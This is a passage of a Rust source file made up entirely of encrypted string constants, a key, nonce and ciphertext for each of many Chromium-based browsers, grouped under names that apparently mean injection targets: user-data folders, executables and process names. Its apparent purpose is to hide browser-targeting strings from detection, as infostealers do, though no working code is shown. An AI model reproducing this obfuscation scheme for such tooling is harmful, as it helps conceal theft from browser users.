pub static INJ_UD_AMIGO_NONCE: [u8; 12] = [0xF5, 0x2F, 0x87, 0xDE, 0x23, 0x2D, 0x79, 0x95, 0x25, 0xB6, 0xAB, 0xDC];
pub static INJ_UD_AMIGO_ENC: &[u8] = &[0x13, 0x69, 0x74, 0x0A, 0xBE, 0x3D, 0x04, 0x0B, 0xEE, 0xA1, 0xA2, 0x0B, 0xC8, 0xEF, 0x9B, 0xDC, 0x08, 0xED, 0xAA, 0xCA, 0xBE, 0x31, 0xF0, 0x4F, 0x09, 0x8F, 0x20, 0xA6, 0x2B, 0x23, 0xBD];
pub static INJ_UD_SPUTNIK_KEY: [u8; 32] = [0x8D, 0xA5, 0xB8, 0x80, 0x24, 0xA1, 0xD6, 0xF1, 0x83, 0xE7, 0x7B, 0x1E, 0x31, 0x1D, 0xB1, 0x47, 0x7D, 0x39, 0xEF, 0x3E, 0x2F, 0x1D, 0x69, 0x38, 0xC9, 0x57, 0xD0, 0x03, 0x5B, 0xF5, 0x8F, 0xB7];
pub static INJ_UD_SPUTNIK_NONCE: [u8; 12] = [0x11, 0xFC, 0xDE, 0xF2, 0xDB, 0x9A, 0x51, 0x8A, 0xC9, 0x89, 0xB9, 0x03];
pub static INJ_UD_SPUTNIK_ENC: &[u8] = &[0x56, 0xAE, 0x4C, 0x04, 0x74, 0x43, 0x3E, 0x37, 0x45, 0x95, 0x83, 0xD2, 0xEF, 0x0C, 0x10, 0x29, 0x2A, 0xA0, 0x17, 0xC0, 0xF3, 0x30, 0x8C, 0x38, 0x08, 0x8C, 0xCE, 0xE8, 0x58, 0x78, 0x99, 0x0B, 0xD9, 0xB4, 0x8C, 0xD6, 0xAA, 0x70, 0xE1, 0x5D, 0x9F];
pub static INJ_UD_SLIMJET_KEY: [u8; 32] = [0x9B, 0xA7, 0xB3, 0xCA, 0xBE, 0xF5, 0x21, 0xDA, 0x6D, 0xE7, 0xAB, 0x36, 0x81, 0x3A, 0x1A, 0xA8, 0xD2, 0x11, 0x0A, 0x67, 0x67, 0xE9, 0x80, 0xD5, 0x9B, 0xFC, 0xAA, 0x26, 0x07, 0x22, 0xF2, 0xDC];
pub static INJ_UD_SLIMJET_NONCE: [u8; 12] = [0x0E, 0x18, 0xC4, 0xBE, 0x0C, 0x5E, 0x16, 0x4F, 0xAF, 0xE1, 0x1E, 0xC6];
pub static INJ_UD_SLIMJET_ENC: &[u8] = &[0x53, 0x7C, 0xD3, 0x2D, 0xE9, 0xF5, 0x9F, 0x6F, 0x9D, 0xF6, 0xAF, 0x11, 0x63, 0x8D, 0x0C, 0xE3, 0x65, 0xEA, 0x49, 0x54, 0xBE, 0xB0, 0xF0, 0x41, 0xCB, 0x4D, 0xA8, 0x02, 0xA5, 0xDC, 0x2D, 0x75, 0xFB];
pub static INJ_UD_IRIDIUM_KEY: [u8; 32] = [0x8F, 0x6C, 0xF7, 0xCA, 0x05, 0xE2, 0x5D, 0xE8, 0x3B, 0x3E, 0x94, 0xEE, 0x0A, 0x43, 0x50, 0x88, 0x93, 0x68, 0x1F, 0x2F, 0xC2, 0x2E, 0xB1, 0xCF, 0xA8, 0xBB, 0x29, 0x91, 0xA5, 0xC1, 0x5E, 0x8C];
pub static INJ_UD_IRIDIUM_NONCE: [u8; 12] = [0x58, 0x3C, 0x15, 0xF7, 0xF7, 0xBD, 0xE2, 0x9B, 0x18, 0x80, 0xC1, 0x9A];
pub static INJ_UD_IRIDIUM_ENC: &[u8] = &[0xE9, 0xBB, 0x68, 0xBE, 0x35, 0x9B, 0x40, 0xB4, 0xD7, 0xDE, 0x33, 0xD8, 0xE7, 0xE4, 0x71, 0x46, 0xA1, 0x57, 0x7A, 0xD1, 0xFF, 0x87, 0x0F, 0xF7, 0x6A, 0xAE, 0x24, 0x56, 0x3D, 0x7A, 0xB5, 0x23, 0x05];
pub static INJ_UD_THORIUM_KEY: [u8; 32] = [0xF6, 0xEF, 0xA9, 0xB2, 0x17, 0x19, 0x42, 0xCF, 0x93, 0xAC, 0x6C, 0x8B, 0x60, 0xD8, 0xF9, 0x0D, 0xC3, 0xA3, 0xF6, 0x59, 0xE8, 0xB6, 0x06, 0x8E, 0x66, 0x9D, 0x21, 0x6B, 0xA1, 0x30, 0x9F, 0x9F];
pub static INJ_UD_THORIUM_NONCE: [u8; 12] = [0x37, 0xAF, 0x01, 0xFA, 0x2E, 0x85, 0x21, 0x7D, 0x3F, 0xA4, 0xBC, 0x8A];
pub static INJ_UD_THORIUM_ENC: &[u8] = &[0xA6, 0xC0, 0x36, 0xFC, 0x54, 0xA1, 0x86, 0x0E, 0x3B, 0x1B, 0x08, 0x03, 0x8E, 0x63, 0xCF, 0x1D, 0x5D, 0x0A, 0x5B, 0x8A, 0x5E, 0x01, 0xA1, 0x16, 0xA5, 0x26, 0x9F, 0x18, 0xFD, 0x93, 0x9E, 0x11, 0x6A];
pub static INJ_UD_ARC_KEY: [u8; 32] = [0x37, 0x5D, 0x68, 0x5C, 0xA0, 0xC7, 0xC0, 0xCF, 0x67, 0xDA, 0x79, 0x73, 0x56, 0x75, 0x32, 0x8E, 0x1F, 0xBA, 0x8A, 0xFF, 0xF2, 0xBC, 0x16, 0x0E, 0xDF, 0xAB, 0xC1, 0x8B, 0x06, 0x23, 0x2A, 0x84];
pub static INJ_UD_ARC_NONCE: [u8; 12] = [0x65, 0x4F, 0x2D, 0x83, 0x1D, 0xA4, 0x7E, 0x3D, 0xE6, 0x44, 0xD9, 0x77];
pub static INJ_UD_ARC_ENC: &[u8] = &[0xFB, 0xEB, 0x6D, 0xDD, 0x17, 0x55, 0x02, 0x65, 0x52, 0x47, 0x50, 0xDF, 0xD1, 0xF2, 0x90, 0x45, 0xA0, 0xBC, 0x9E, 0x5E, 0x62, 0x94, 0xE7, 0xDC, 0x51, 0xB6, 0x99, 0x3C, 0xEF, 0xB5, 0xE9, 0x8E, 0xDF, 0x2B, 0xF2, 0x7D, 0xDD, 0xD0, 0x28, 0x21, 0x41, 0x6C, 0xEF, 0x2B, 0x8A, 0x44, 0x39, 0xAA, 0x7F];
pub static INJ_EXE_360CHROME_KEY: [u8; 32] = [0xDE, 0xFB, 0xE7, 0x40, 0x1B, 0x71, 0x23, 0xC7, 0xAC, 0xAF, 0xB7, 0x19, 0x24, 0xD7, 0x8F, 0x46, 0xDF, 0xB3, 0xA2, 0x2E, 0x45, 0x54, 0xB2, 0x85, 0x7D, 0x3D, 0x70, 0xB4, 0x23, 0x63, 0x5D, 0xDC];
pub static INJ_EXE_360CHROME_NONCE: [u8; 12] = [0xDB, 0x4C, 0x5C, 0x9F, 0x96, 0x29, 0xD4, 0x16, 0x33, 0x5F, 0x2A, 0xB0];
pub static INJ_EXE_360CHROME_ENC: &[u8] = &[0xAA, 0x1A, 0xA8, 0x1B, 0xD2, 0x28, 0x62, 0x61, 0x3B, 0xE0, 0x40, 0x82, 0x00, 0xAB, 0xC9, 0xB5, 0x17, 0x6B, 0x6E, 0x4C, 0x12, 0xC6, 0xB7, 0xB8, 0x5E, 0xEC, 0x7B, 0x0B, 0xA0];
pub static INJ_EXE_EPIC_KEY: [u8; 32] = [0xA8, 0x87, 0x30, 0x39, 0x55, 0xC5, 0xA8, 0x98, 0xE8, 0xF3, 0x04, 0xBB, 0xB5, 0xBB, 0xF4, 0x89, 0xD3, 0x6B, 0x87, 0x1E, 0xB4, 0xA2, 0x0F, 0xDB, 0xD1, 0x37, 0xC7, 0x04, 0x9E, 0xEF, 0x51, 0x66];
pub static INJ_EXE_EPIC_NONCE: [u8; 12] = [0x5A, 0x67, 0xF4, 0xCD, 0xE9, 0xB2, 0x49, 0xDE, 0x78, 0xB0, 0xF1, 0x1C];
pub static INJ_EXE_EPIC_ENC: &[u8] = &[0x5A, 0x2F, 0xA6, 0x97, 0x46, 0x47, 0x4A, 0xC3, 0xAF, 0x1F, 0x95, 0xE0, 0xBD, 0xF0, 0x8E, 0x32, 0xEA, 0x7F, 0xAD, 0x8A, 0x0F, 0x0E, 0x18, 0xA4];
pub static INJ_EXE_URAN_KEY: [u8; 32] = [0x4E, 0xD6, 0xCA, 0x53, 0x0E, 0xDF, 0x3D, 0x02, 0xEF, 0x2D, 0x37, 0x6D, 0x95, 0xB5, 0x3C, 0xD6, 0x6E, 0x12, 0x8F, 0xB5, 0xB2, 0x0C, 0x66, 0x0E, 0x06, 0x6A, 0x2D, 0x4F, 0xFB, 0x41, 0x98, 0xEE];
pub static INJ_EXE_URAN_NONCE: [u8; 12] = [0xE5, 0x02, 0x1C, 0x15, 0xF4, 0xC2, 0xA8, 0xB7, 0x87, 0x7D, 0x0F, 0x02];
pub static INJ_EXE_URAN_ENC: &[u8] = &[0x1B, 0x3F, 0x0B, 0x2C, 0x0E, 0x53, 0xF1, 0x8C, 0xE0, 0x36, 0xAD, 0xBB, 0x71, 0x1B, 0x7C, 0x20, 0xBF, 0x60, 0x46, 0xFB, 0xFB, 0x02, 0x88, 0x20];
pub static INJ_EXE_7STAR_KEY: [u8; 32] = [0xEB, 0x72, 0xCC, 0x59, 0x26, 0x05, 0x37, 0xB3, 0xE6, 0xE2, 0x10, 0x33, 0x34, 0x44, 0x1A, 0x16, 0xFB, 0xCF, 0x5B, 0xB2, 0x66, 0x56, 0xAA, 0xA1, 0xAB, 0xC3, 0xEA, 0xA8, 0xCB, 0xC6, 0x58, 0x50];
pub static INJ_EXE_7STAR_NONCE: [u8; 12] = [0xE0, 0x08, 0xE5, 0x7D, 0x46, 0xD6, 0xA0, 0x9B, 0x1B, 0x6E, 0x75, 0x21];
pub static INJ_EXE_7STAR_ENC: &[u8] = &[0x9E, 0x81, 0x77, 0x24, 0x38, 0xCA, 0x55, 0x82, 0xE7, 0x22, 0x1F, 0x65, 0x87, 0x7C, 0xF4, 0xFC, 0xC4, 0x07, 0x68, 0x1B, 0x82, 0x48, 0x83, 0x6D, 0x3E];
pub static INJ_EXE_TORCH_KEY: [u8; 32] = [0xF7, 0xA9, 0x67, 0xD1, 0xC2, 0xDD, 0x44, 0x86, 0x56, 0x58, 0x57, 0xF1, 0xE4, 0x25, 0xD8, 0x62, 0x70, 0x3F, 0xCD, 0x15, 0x0A, 0xD9, 0x7D, 0x8B, 0x4F, 0x3B, 0x07, 0x40, 0x6E, 0xD6, 0xC9, 0x6B];
pub static INJ_EXE_TORCH_NONCE: [u8; 12] = [0x3A, 0x26, 0x75, 0x1F, 0x8A, 0x88, 0x78, 0xE0, 0xE5, 0x82, 0x70, 0x86];
pub static INJ_EXE_TORCH_ENC: &[u8] = &[0x94, 0xAA, 0x8D, 0xD2, 0xBF, 0xAA, 0x1A, 0x79, 0x1A, 0x45, 0x7A, 0x89, 0xF9, 0x10, 0x5E, 0xCE, 0x7A, 0x36, 0x31, 0x71, 0x07, 0x4E, 0x13, 0x9B, 0xB0];
pub static INJ_EXE_KOMETA_KEY: [u8; 32] = [0x27, 0x0A, 0xE4, 0x6D, 0x90, 0xDD, 0x3E, 0xDF, 0x41, 0x55, 0xB8, 0x4E, 0x21, 0x09, 0xBC, 0x3E, 0x8D, 0x70, 0xFA, 0xF0, 0x7A, 0x8F, 0x0F, 0xBB, 0x97, 0xD2, 0x27, 0x95, 0x4B, 0x22, 0x61, 0x22];
pub static INJ_EXE_KOMETA_NONCE: [u8; 12] = [0x17, 0x54, 0x11, 0x9D, 0xB9, 0xB0, 0xF1, 0x52, 0xF0, 0xE9, 0x8F, 0x61];
pub static INJ_EXE_KOMETA_ENC: &[u8] = &[0x20, 0xD2, 0x90, 0xFE, 0x8F, 0xF6, 0x49, 0x5B, 0x2E, 0xAD, 0x25, 0x00, 0x52, 0x7D, 0xF1, 0x37, 0x2D, 0xFD, 0x00, 0x4B, 0x5D, 0x86, 0x17, 0x52, 0x74, 0x47];
pub static INJ_EXE_ORBITUM_KEY: [u8; 32] = [0x69, 0x4C, 0x0A, 0x8F, 0xAF, 0x53, 0x28, 0xBD, 0x68, 0xF8, 0xC2, 0x95, 0x6D, 0x4E, 0x24, 0x7C, 0x0E, 0x6C, 0x5D, 0xEC, 0x83, 0x03, 0xCC, 0x78, 0xBF, 0xEE, 0x31, 0xC7, 0x78, 0x6E, 0x2B, 0x6A];
pub static INJ_EXE_ORBITUM_NONCE: [u8; 12] = [0x94, 0xA4, 0x5F, 0x35, 0xA7, 0x44, 0x0F, 0x75, 0xFB, 0x36, 0xFD, 0x90];
pub static INJ_EXE_ORBITUM_ENC: &[u8] = &[0x89, 0x01, 0xAF, 0x8E, 0xCC, 0x8A, 0xDF, 0xFB, 0x91, 0x04, 0x63, 0x53, 0x49, 0x26, 0x05, 0x04, 0xFB, 0x5B, 0x77, 0x2A, 0xD5, 0x60, 0x8F, 0xC9, 0x17, 0x11, 0xBF];
pub static INJ_EXE_AMIGO_KEY: [u8; 32] = [0x2B, 0x5B, 0x2C, 0xD8, 0x34, 0xCD, 0x20, 0xCE, 0x6B, 0x83, 0x47, 0x71, 0x6E, 0x08, 0x1D, 0xE2, 0x23, 0x2C, 0xF6, 0x2D, 0x51, 0x42, 0x64, 0x73, 0xFB, 0xDC, 0xC9, 0x68, 0xC6, 0x5E, 0xAB, 0x7B];
pub static INJ_EXE_AMIGO_NONCE: [u8; 12] = [0x86, 0xA7, 0x03, 0xA4, 0xE7, 0xBC, 0x9C, 0x5D, 0x40, 0xD3, 0x05, 0x74];
pub static INJ_EXE_AMIGO_ENC: &[u8] = &[0xF7, 0x86, 0x80, 0x09, 0x4F, 0x38, 0xEF, 0x0C, 0x25, 0xE4, 0xD6, 0x5D, 0x0F, 0xB9, 0x1C, 0xE9, 0x63, 0x9F, 0xDA, 0x46, 0xC6, 0xD5, 0x11, 0x53, 0x8F];
pub static INJ_EXE_SPUTNIK_KEY: [u8; 32] = [0xF7, 0x9E, 0xB7, 0x2F, 0xFA, 0x5A, 0x24, 0xFF, 0x3F, 0xB7, 0xDE, 0xEC, 0x57, 0x7B, 0xA9, 0x9F, 0x46, 0xE1, 0xBF, 0x87, 0xCD, 0x96, 0x28, 0x59, 0xB3, 0x46, 0x7A, 0xA3, 0xBF, 0x29, 0x8B, 0xF5];
pub static INJ_EXE_SPUTNIK_NONCE: [u8; 12] = [0xAC, 0x75, 0xEC, 0x65, 0x26, 0x4A, 0xAC, 0x5F, 0x14, 0xCA, 0xE4, 0xD3];
pub static INJ_EXE_SPUTNIK_ENC: &[u8] = &[0x42, 0xAD, 0xC2, 0x6D, 0x1C, 0xC1, 0xE9, 0x17, 0x19, 0xE0, 0x80, 0xF4, 0xE3, 0x66, 0xB6, 0x9E, 0xEA, 0x4F, 0x4F, 0xFF, 0x54, 0x89, 0xED, 0x4C, 0x06, 0x5D, 0x15];
pub static INJ_EXE_SLIMJET_KEY: [u8; 32] = [0x00, 0x7D, 0xF5, 0xA0, 0xF1, 0x1F, 0x6D, 0x49, 0x95, 0xBD, 0x4A, 0x5B, 0x10, 0x06, 0x42, 0xB1, 0xFC, 0x33, 0xAE, 0x16, 0xA8, 0x0D, 0x59, 0x78, 0x65, 0xDC, 0x91, 0xF8, 0xB3, 0x98, 0x83, 0xF3];
pub static INJ_EXE_SLIMJET_NONCE: [u8; 12] = [0xF4, 0x0A, 0x5E, 0x60, 0x94, 0x09, 0x6B, 0xE1, 0x30, 0x3C, 0xA7, 0x48];
pub static INJ_EXE_SLIMJET_ENC: &[u8] = &[0xF4, 0x88, 0xC2, 0xE7, 0x9B, 0x23, 0xEB, 0xDC, 0xF9, 0x0C, 0x27, 0xD4, 0x93, 0xF3, 0x74, 0x59, 0xE2, 0x2D, 0xDF, 0xA8, 0x6A, 0xFF, 0x19, 0x7F, 0x8D, 0xA5, 0xB0];
pub static INJ_EXE_IRIDIUM_KEY: [u8; 32] = [0x32, 0x58, 0x02, 0xCA, 0x9D, 0x99, 0x6F, 0x25, 0x77, 0x5F, 0x49, 0x05, 0x57, 0x8A, 0x7A, 0x26, 0x5C, 0xD5, 0x5A, 0x8B, 0x77, 0x0F, 0x5D, 0xDE, 0x42, 0x02, 0xDE, 0x0C, 0x12, 0x73, 0x90, 0x23];
pub static INJ_EXE_IRIDIUM_NONCE: [u8; 12] = [0x8D, 0x61, 0x79, 0x0E, 0x1B, 0xCC, 0x40, 0x1F, 0xD9, 0x4C, 0xD4, 0x84];
pub static INJ_EXE_IRIDIUM_ENC: &[u8] = &[0xB6, 0x90, 0x0C, 0x3C, 0xA3, 0x29, 0xB1, 0xBA, 0xC6, 0x91, 0xE2, 0xF8, 0xA5, 0x6D, 0xBE, 0xA4, 0xC4, 0x6C, 0x3D, 0xB3, 0x29, 0x92, 0x55, 0x79, 0xA7, 0xF5, 0x14];
pub static INJ_EXE_THORIUM_KEY: [u8; 32] = [0x22, 0x1B, 0x0F, 0x8F, 0xFF, 0xE3, 0xDD, 0xF3, 0x50, 0xAA, 0xC5, 0xF6, 0xF9, 0x08, 0x0B, 0x64, 0x96, 0x49, 0x6F, 0x9C, 0x85, 0x1F, 0x84, 0xE5, 0x8C, 0xC8, 0x01, 0x5B, 0x57, 0x7A, 0x90, 0x47];
pub static INJ_EXE_THORIUM_NONCE: [u8; 12] = [0x6C, 0x5F, 0x6C, 0xB9, 0x53, 0x87, 0xE5, 0xD7, 0xBD, 0x14, 0xA8, 0xF8];
pub static INJ_EXE_THORIUM_ENC: &[u8] = &[0x4A, 0x0C, 0x06, 0x66, 0x5D, 0x4C, 0x83, 0xFF, 0x53, 0xF8, 0xBE, 0x8A, 0x77, 0xDE, 0xF3, 0x17, 0x4D, 0xF8, 0xBB, 0xDB, 0x62, 0x98, 0x78, 0x7D, 0x0F, 0x68, 0x22];
pub static INJ_EXE_ARC_KEY: [u8; 32] = [0x48, 0x15, 0x7C, 0x4F, 0xEA, 0x27, 0xD8, 0x8A, 0x64, 0x86, 0x22, 0xB0, 0x61, 0xBB, 0xB5, 0xED, 0x12, 0xC7, 0xC5, 0xCA, 0xE5, 0xDF, 0x9A, 0xEB, 0xF0, 0x04, 0xEB, 0x93, 0xAF, 0xA2, 0xE6, 0x97];
pub static INJ_EXE_ARC_NONCE: [u8; 12] = [0x7F, 0x36, 0x94, 0x19, 0x95, 0x4F, 0x1B, 0x98, 0xFA, 0x54, 0x68, 0x48];
pub static INJ_EXE_ARC_ENC: &[u8] = &[0x78, 0x4E, 0x33, 0x94, 0x7F, 0xB9, 0x69, 0x2B, 0x09, 0xD5, 0x0C, 0x96, 0xC5, 0xCA, 0x56, 0x69, 0x60, 0x27, 0xB3, 0xD3, 0xDB, 0x26, 0x43];
pub static INJ_NAME_CHROME_KEY: [u8; 32] = [0x13, 0xA3, 0xB8, 0x7C, 0xA6, 0x82, 0x16, 0x4F, 0x8F, 0x54, 0x99, 0x5B, 0x21, 0x54, 0x5F, 0x92, 0x74, 0x97, 0x0A, 0x9D, 0x8B, 0x7E, 0x8B, 0x98, 0x2E, 0xA1, 0x70, 0x85, 0x2A, 0x1D, 0xA4, 0xAD];
pub static INJ_NAME_CHROME_NONCE: [u8; 12] = [0xF7, 0x19, 0x42, 0x1A, 0x39, 0x11, 0x56, 0x1F, 0xC0, 0xD1, 0xD8, 0xA3];
pub static INJ_NAME_CHROME_ENC: &[u8] = &[0xD0, 0xA3, 0xD8, 0x19, 0xE4, 0xD3, 0xB6, 0xDE, 0xDD, 0x54, 0x0B, 0xD0, 0x9F, 0x77, 0x24, 0x3B, 0xCF, 0x10, 0x4A, 0x66, 0x6F, 0xB5];
pub static INJ_NAME_CHROME_BETA_KEY: [u8; 32] = [0x15, 0xDB, 0x02, 0x8B, 0xF4, 0xD3, 0x4D, 0x85, 0xFD, 0x3E, 0x79, 0xCB, 0x06, 0x7F, 0xFD, 0x5F, 0xC1, 0x22, 0x66, 0xD7, 0xFC, 0x2B, 0x50, 0x87, 0xFB, 0xF8, 0x55, 0x22, 0x8F, 0x6F, 0xB7, 0x2B];
pub static INJ_NAME_CHROME_BETA_NONCE: [u8; 12] = [0xE4, 0xD7, 0x51, 0x96, 0xE6, 0x94, 0x97, 0x4C, 0x57, 0xA9, 0xD5, 0x44];
pub static INJ_NAME_CHROME_BETA_ENC: &[u8] = &[0x7E, 0x5D, 0x31, 0xEF, 0x2A, 0x6B, 0xBD, 0x0A, 0x46, 0x35, 0x79, 0xE8, 0xDA, 0xAE, 0x2D, 0x69, 0x0A, 0xB3, 0x98, 0xA7, 0xAC, 0x33, 0xD5, 0xE1, 0x2D, 0x8D, 0x74];
pub static INJ_NAME_CHROME_DEV_KEY: [u8; 32] = [0xFA, 0xFC, 0x83, 0x87, 0x8B, 0x4C, 0xEF, 0x9F, 0x95, 0x63, 0xB1, 0x50, 0x76, 0x6E, 0x96, 0x5C, 0xD0, 0xEE, 0x5F, 0xB0, 0x22, 0x37, 0x59, 0x55, 0x2F, 0x52, 0xBF, 0xEC, 0xC4, 0xE7, 0xF1, 0x6F];
pub static INJ_NAME_CHROME_DEV_NONCE: [u8; 12] = [0xAC, 0x40, 0x35, 0x84, 0xF8, 0x71, 0xA4, 0x4D, 0x99, 0xBD, 0x1E, 0x4C];
pub static INJ_NAME_CHROME_DEV_ENC: &[u8] = &[0x30, 0xA0, 0x5B, 0x46, 0xE7, 0x74, 0x95, 0x5C, 0x55, 0xE3, 0x9B, 0x9C, 0x9F, 0x91, 0x48, 0x7C, 0x3F, 0xE7, 0x2E, 0x4D, 0x21, 0xA9, 0x00, 0xD8, 0x47, 0xFD];
pub static INJ_NAME_CHROME_CANARY_KEY: [u8; 32] = [0xE2, 0xEA, 0xC5, 0xE9, 0x9A, 0x20, 0x10, 0x75, 0x37, 0x09, 0x37, 0xE7, 0x98, 0x5F, 0x59, 0x5E, 0x57, 0x18, 0x63, 0x0A, 0x02, 0x82, 0xB8, 0xF0, 0x9F, 0xCB, 0x1A, 0xE9, 0x36, 0x08, 0xBE, 0x2B];
pub static INJ_NAME_CHROME_CANARY_NONCE: [u8; 12] = [0xE3, 0x8C, 0xFF, 0x16, 0xE8, 0x03, 0x53, 0xC6, 0x3D, 0xB2, 0x41, 0x4E];
pub static INJ_NAME_CHROME_CANARY_ENC: &[u8] = &[0x94, 0x2A, 0x19, 0x74, 0x26, 0x92, 0x7E, 0x66, 0x9E, 0xE6, 0xA0, 0xE8, 0x26, 0xE8, 0xC4, 0xA0, 0x66, 0x73, 0x83, 0xC9, 0xD4, 0x88, 0xDE, 0x1D, 0xE8, 0x1F, 0x77, 0xED, 0x65];
pub static INJ_NAME_CHROMIUM_KEY: [u8; 32] = [0xC9, 0xBA, 0x60, 0xB8, 0x38, 0x98, 0x0A, 0xFF, 0x89, 0x7A, 0x5B, 0xCA, 0xA1, 0x5B, 0x98, 0xB5, 0x51, 0xD2, 0xED, 0x50, 0x3A, 0x1F, 0x51, 0x89, 0x2A, 0xE4, 0xF0, 0x55, 0x7E, 0x72, 0x3A, 0xD2];
pub static INJ_NAME_CHROMIUM_NONCE: [u8; 12] = [0x77, 0xCA, 0xDF, 0xE8, 0xBA, 0x54, 0x0C, 0x2E, 0xD6, 0x0D, 0x00, 0x53];
pub static INJ_NAME_CHROMIUM_ENC: &[u8] = &[0xBC, 0xAA, 0xBC, 0x99, 0x95, 0xC9, 0xD3, 0x4E, 0x00, 0x19, 0x40, 0x60, 0x1B, 0x91, 0x0D, 0xA3, 0xBA, 0xD7, 0x8D, 0x88, 0x31, 0x6D, 0xC5, 0xC2];
pub static INJ_NAME_EDGE_KEY: [u8; 32] = [0x44, 0xBF, 0x37, 0x6B, 0x67, 0x6A, 0x82, 0x51, 0x8D, 0x0E, 0x90, 0xC6, 0x19, 0xE3, 0x4E, 0x98, 0x12, 0xAE, 0xCA, 0xE6, 0x35, 0xE3, 0x2B, 0xD5, 0x95, 0xE7, 0x0C, 0x80, 0x2E, 0x70, 0x00, 0x42];
pub static INJ_NAME_EDGE_NONCE: [u8; 12] = [0x46, 0xE9, 0x93, 0x5D, 0x67, 0x12, 0x0C, 0x22, 0xC1, 0x0E, 0x39, 0xC7];
pub static INJ_NAME_EDGE_ENC: &[u8] = &[0xDD, 0xF5, 0x4D, 0xC3, 0x93, 0x30, 0xCA, 0x57, 0xDD, 0x6D, 0x7F, 0xEE, 0xCE, 0x85, 0x97, 0xD8, 0x76, 0x04, 0x2A, 0x1D];
pub static INJ_NAME_EDGE_BETA_KEY: [u8; 32] = [0xC5, 0x2C, 0x67, 0x82, 0xBF, 0xD6, 0x5B, 0x94, 0xB3, 0x4F, 0x7D, 0xB6, 0x8A, 0xAF, 0x16, 0x54, 0x0D, 0x0D, 0xEA, 0x4F, 0x94, 0x8C, 0xA1, 0xF7, 0xA5, 0xA5, 0xCB, 0x2F, 0x73, 0xA3, 0xF2, 0x50];
pub static INJ_NAME_EDGE_BETA_NONCE: [u8; 12] = [0xD7, 0xF3, 0xA7, 0x16, 0xEB, 0xCA, 0xA4, 0xD9, 0xF7, 0x8A, 0x92, 0x3E];
pub static INJ_NAME_EDGE_BETA_ENC: &[u8] = &[0xB8, 0xDB, 0xC4, 0x6A, 0x07, 0x6F, 0x6D, 0x7B, 0x19, 0xC2, 0x9D, 0x74, 0x11, 0xAD, 0x31, 0xEE, 0xD4, 0xDC, 0xCB, 0xAD, 0x76, 0xA7, 0xAE, 0xCC, 0xDB];
pub static INJ_NAME_EDGE_DEV_KEY: [u8; 32] = [0x46, 0x8E, 0xCC, 0x52, 0x5F, 0x8A, 0xC3, 0xB4, 0x22, 0xAD, 0xA2, 0x6E, 0x7F, 0x28, 0xDE, 0x51, 0xB3, 0x0D, 0x41, 0x85, 0x1A, 0x26, 0xC7, 0xB6, 0xA0, 0x98, 0x15, 0xCE, 0x1E, 0x99, 0xFD, 0x6F];
pub static INJ_NAME_EDGE_DEV_NONCE: [u8; 12] = [0x3B, 0x4C, 0xAC, 0xB7, 0x64, 0x5C, 0xCD, 0x73, 0x77, 0xB0, 0x15, 0x73];
pub static INJ_NAME_EDGE_DEV_ENC: &[u8] = &[0xEB, 0x23, 0x9F, 0x17, 0x7A, 0xE9, 0xCE, 0x36, 0x34, 0xD9, 0x8B, 0x0E, 0x7A, 0xDE, 0x3E, 0x80, 0xEA, 0xB0, 0x35, 0x34, 0xB8, 0x99, 0x02, 0x70];
pub static INJ_NAME_BRAVE_KEY: [u8; 32] = [0xEC, 0x2D, 0x1F, 0xCC, 0x9F, 0xD2, 0xB1, 0xDA, 0x5D, 0x9E, 0x86, 0x79, 0x4B, 0x77, 0xD2, 0x9D, 0x6F, 0x40, 0x0E, 0x41, 0xE8, 0x21, 0xA2, 0xBE, 0x5B, 0x9A, 0xC0, 0x3C, 0xA3, 0xD4, 0xA0, 0x37];
pub static INJ_NAME_BRAVE_NONCE: [u8; 12] = [0xB8, 0xA4, 0x9F, 0xDB, 0xCF, 0x4C, 0xD5, 0x8E, 0x04, 0x41, 0xC9, 0xD2];
pub static INJ_NAME_BRAVE_ENC: &[u8] = &[0x6E, 0x81, 0xC7, 0x3A, 0x0F, 0x84, 0xE1, 0x53, 0x38, 0x42, 0x36, 0xBE, 0xCE, 0xF4, 0xB4, 0x11, 0xCB, 0x61, 0x89, 0xA7, 0x89];
pub static INJ_NAME_BRAVE_BETA_KEY: [u8; 32] = [0x21, 0x91, 0x12, 0x33, 0xE2, 0x3B, 0x42, 0x2D, 0x5A, 0xF1, 0x30, 0x72, 0x9B, 0x64, 0xB4, 0x43, 0xD1, 0xF1, 0xF6, 0x8C, 0x8D, 0xC4, 0xAB, 0xB0, 0x08, 0xD9, 0xE5, 0xBC, 0x68, 0x35, 0x6F, 0xE7];
pub static INJ_NAME_BRAVE_BETA_NONCE: [u8; 12] = [0x73, 0xC9, 0x88, 0x32, 0xF5, 0xC4, 0xEA, 0xCC, 0x91, 0x30, 0x13, 0x82];
pub static INJ_NAME_BRAVE_BETA_ENC: &[u8] = &[0x3C, 0x47, 0x54, 0x19, 0xA2, 0x61, 0xFE, 0x68, 0x6F, 0x3D, 0x2D, 0xB5, 0xE5, 0xBB, 0xAD, 0xB1, 0xDF, 0xAD, 0x85, 0x26, 0x6F, 0x9F, 0x99, 0x71, 0x67, 0x41];
pub static INJ_NAME_BRAVE_NIGHTLY_KEY: [u8; 32] = [0x8F, 0xD4, 0x4A, 0x85, 0xD5, 0x0B, 0x5D, 0x25, 0xFF, 0xA8, 0x64, 0xA9, 0x31, 0xC5, 0x49, 0x5E, 0x50, 0x7C, 0x20, 0x8C, 0x4C, 0xB9, 0x37, 0xE7, 0x3F, 0x46, 0x9C, 0x73, 0x9C, 0x2D, 0x49, 0xC2];
pub static INJ_NAME_BRAVE_NIGHTLY_NONCE: [u8; 12] = [0x77, 0x02, 0x6D, 0x99, 0x61, 0x06, 0x62, 0x6C, 0x8D, 0x2F, 0x15, 0xEF];
pub static INJ_NAME_BRAVE_NIGHTLY_ENC: &[u8] = &[0x6D, 0xE5, 0x2A, 0x31, 0xDE, 0xB0, 0xF2, 0xA1, 0x09, 0x71, 0xAA, 0xFB, 0x2C, 0x57, 0xAC, 0x76, 0xB1, 0xA5, 0xCC, 0x1A, 0xD0, 0xD5, 0x55, 0x55, 0x6C, 0x3E, 0x27, 0xF6, 0x3E];
pub static INJ_NAME_OPERA_KEY: [u8; 32] = [0x52, 0xBB, 0x05, 0x93, 0x2D, 0x5D, 0x95, 0x7E, 0xC8, 0x62, 0x9F, 0xC7, 0x51, 0x9E, 0x72, 0xA4, 0xE0, 0x9C, 0x82, 0x67, 0x74, 0xAE, 0x1C, 0x98, 0xF6, 0x76, 0x09, 0xD6, 0xD9, 0x30, 0x91, 0x35];
pub static INJ_NAME_OPERA_NONCE: [u8; 12] = [0x5E, 0x76, 0x34, 0xB1, 0xD7, 0x6F, 0x08, 0x85, 0xD4, 0x57, 0x04, 0x74];
